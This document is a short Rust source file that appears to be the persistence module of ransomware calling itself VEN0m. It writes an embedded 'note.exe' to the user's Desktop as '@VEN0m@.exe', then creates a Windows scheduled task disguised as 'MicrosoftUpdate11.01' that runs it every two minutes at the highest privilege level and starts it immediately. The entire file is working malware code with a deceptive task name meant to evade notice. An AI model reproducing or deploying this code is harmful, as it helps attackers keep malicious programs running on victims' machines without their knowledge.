use anyhow::{Result, Context};
use std::process::Command;
use std::io::Write;

pub fn register() -> Result<()> {

    let note_bytes = include_bytes!("..\\target\\release\\note.exe");
    let task_name = "MicrosoftUpdate11.01";
    let user_profile = std::env::var("USERPROFILE").context("[!] Failed to get USERPROFILE!")?;

    let sys_path = format!("{}\\Desktop\\@VEN0m@.exe", user_profile);

        // The written file has to be out of scope in order to use it
        {
            let mut file = std::fs::File::create(&sys_path).context("[!] Failed to create note file!")?;
            file.write_all(note_bytes).context("[!] Failed to data to file")?;
        }
        println!("[+] Note dropped to {}", sys_path);


    let output = Command::new("schtasks")
        .args([
            "/Create",
            "/SC", "MINUTE",
            "/MO", "2",
            "/TN", task_name,
            "/TR", &sys_path,
            "/RL", "HIGHEST",
            "/F",             
        ])
        .output()
        .context("Failed to execute schtasks")?;

    let output = Command::new("schtasks")
        .args(["/Run", "/TN", task_name])
        .output()
        .context("Failed to execute schtasks")?;


    Ok(())
}